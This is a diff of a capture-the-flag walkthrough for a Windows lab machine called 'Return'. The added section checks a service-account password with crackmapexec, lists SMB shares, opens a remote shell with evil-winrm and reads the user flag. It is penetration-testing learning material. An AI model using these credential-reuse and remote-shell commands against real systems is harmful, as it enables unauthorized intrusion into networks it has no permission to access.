@@ -169,15 +169,51 @@ SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763
 
 <br />
 
-Now we are going to `check` if the our `credentials` are valid to the printer user -> `svc-printer`:
+Now we are going to `check` if the `password` that we have obtained before is valid to the printer user -> `svc-printer`:
 
 <br />
 
 ```bash
-❯ crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
+❯ crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' --shares
 SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
-SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!!
+SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
+SMB         10.10.11.108    445    PRINTER          [*] Enumerated shares
+SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
+SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
+SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
+SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
+SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
+SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
+SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share
 ```
 
 <br />
 
+Yes!! It works!!
+
+But now let's `check` something more interesting. Can we use the same `password` to log into de `Windows` System with `evil-winrm`?
+
+<br />
+
+```bash
+❯ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
+dd8fd6aa4466447d6d0c33307cxxxxxx
+```
+
+We did it!! User flag earned, come on with the privilege escalation!!
+
+<br />
+
+# Privilege Escalation: svc-printer -> NT AUTHORITY\SYSTEM
+
+<br />
